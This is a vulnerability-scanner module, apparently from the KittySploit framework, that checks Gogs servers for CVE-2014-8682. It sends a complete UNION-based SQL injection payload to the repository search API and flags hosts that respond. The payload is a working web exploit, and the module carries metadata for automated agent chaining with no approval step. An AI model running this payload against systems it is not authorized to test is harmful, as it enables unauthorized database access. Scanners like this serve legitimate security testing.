#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple SQL injection vulnerabilities in Gogs (aka Go Git Service) 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gogs (Go Git Service) - SQL Injection Detection',
        'description': 'Multiple SQL injection vulnerabilities in Gogs (aka Go Git Service) 0.3.1-9 through 0.5.x before 0.5.6.1105 Beta allow remote attackers to execute arbitrary SQL commands via the q parameter to (1) api/v1/repos/search, which is not properly handled in models/repo.go, or (2) api/v1/users/search, which is not properly handled in models/user.go.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'gogs', 'seclists', 'packetstorm', 'edb', 'sqli', 'gogits', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-8682',
            'http://seclists.org/fulldisclosure/2014/Nov/33',
            'http://packetstormsecurity.com/files/129117/Gogs-Repository-Search-SQL-Injection.html',
            'https://github.com/gogits/gogs/commit/0c5ba4573aecc9eaed669e9431a70a5d9f184b8d',
            'https://www.exploit-db.com/exploits/35238',
        ],
        'cve': 'CVE-2014-8682',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"ok":true', '"data"', '"repolink":"',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Gogs (Go Git Service) - SQL Injection detected",
                path='/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27',
            )
            return True
        return False

